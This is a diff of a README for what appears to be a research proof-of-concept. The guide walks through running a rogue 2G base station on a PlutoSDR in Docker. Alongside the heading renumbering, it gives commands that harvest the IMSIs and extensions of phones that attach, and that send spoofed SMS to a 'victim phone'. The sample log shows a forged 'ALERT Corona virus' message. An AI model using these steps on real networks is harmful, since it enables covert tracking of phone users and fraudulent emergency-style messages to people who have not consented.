@@ -25,7 +25,7 @@ sudo udevadm trigger
 ```
 Unplug and replug PlutoSDR </br>
 
-## II. Installing tools
+## III. Installing tools
 ```
 rm -rf bulk2g_pluto ; mkdir bulk2g_pluto && cd bulk2g_pluto
 ```
@@ -43,15 +43,17 @@ cpupower frequency-set -g performance
 ```
 
 
-## IV. Preparing Dockerfile
+
+## IV. Building images
 ```
 [ -f Dockerfile ] && rm -rf Dockerfile ; \
 wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/Bulg2g_allsdr_docker/refs/heads/main/plutosdr/Dockerfile
 ```
+```
+docker  build -t bulk2g_pluto:v1 .
+```
 
-## Building images
-
-## VI. Launching srsran
+## V. Launching srsran
 ### DIRECT USB
 [screen_shots_usb_direct](https://github.com/SitrakaResearchAndPOC/osmobts_allsdr_docker/tree/main/plutosdr/screenshot_usb_direct)
 ```
@@ -122,7 +124,7 @@ docker exec -it bulk2g_pluto bash -c \
 ```
 
 
-## Testing PlutoSDR driver
+## VI. Testing PlutoSDR driver
 [screen_shot_plutosdr_srsran](https://github.com/SitrakaResearchAndPOC/plutosdr_srsran/tree/main/screen_shot)
 ```
 xhost +
@@ -150,13 +152,14 @@ docker exec -ti bulk2g_pluto bash -c 'SoapySDRUtil --find'
 ```
 docker exec -ti bulk2g_pluto  bash -c 'SoapySDRUtil --probe="driver=plutosdr"'
 ```
-## Launching transceiver
+## VII. Launching transceiver
+### In terminal 1
 ```
 docker exec -ti bulk2g_pluto bash -c 'osmo-trx-soapy -C /opt/src/fork_osmo-trx_soapy/Transceiver52M/test1.cfg'
 ```
 Tape ctrl+shift+T   </br>
 
-# In terminal 2
+### In terminal 2
 launch service   :
 ```
 docker exec -ti bulk2g_pluto bash -c 'cd osmo-nitb-scripts && bash install_services.sh'
@@ -166,8 +169,8 @@ docker exec -ti bulk2g_pluto python3 osmo-nitb-scripts/main_uhd_spoof.py
 ```
 Tape ctrl+shift+T   </br>
 
-# In terminal 3
-## Testing PlutoSDR SpoofScript1
+### In terminal 3
+## VIII. Testing PlutoSDR SpoofScript1
 ```
 docker exec -ti bulk2g_pluto bash osmo-nitb-scripts/scripts_spoof1/finding_imsi_extenstion.sh
 ```
@@ -192,7 +195,7 @@ docker exec -ti bulk2g_pluto  python2 osmo-nitb-scripts/scripts_spoof1/sending_s
 ```
 log should be : subscriber extension 0341220590 sms sender extension 0341220590 send ALERT Corona virus
 
-## Testing PlutoSDR SpoofScript2
+## IX. Testing PlutoSDR SpoofScript2
 ```
 docker exec -ti bulk2g_pluto python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py 
 ```
@@ -221,9 +224,8 @@ You could find imsi and extension
 docker exec -ti bulk2g_pluto  python2 osmo-nitb-scripts/scripts_spoof2/show_subscribers.py
 ```
 
-## Testing PlutoSDR Fake SMS Sender
-# In terminal 1
-
+## X. Testing PlutoSDR Fake SMS Sender
+### In terminal 1
 ```
 ping 192.168.20.1
 ```
@@ -241,7 +243,7 @@ docker exec -ti btspluto bash -c 'osmo-trx-soapy -C /opt/src/fork_osmo-trx_soapy
 ```
 Tape ctrl+shift+T   </br>
 
-# In terminal 2
+### In terminal 2
 
 launch service   :
 ```
@@ -252,7 +254,7 @@ docker exec -ti bulk2g_pluto python3 osmo-nitb-scripts/main_uhd.py
 ```
 Add victim phone and tape Tape ctrl+shift+T
 
-# In terminal 3
+### In terminal 3
 
 ```
 docker exec -ti bulk2g_pluto  cat osmo-nitb-scripts/interact.py
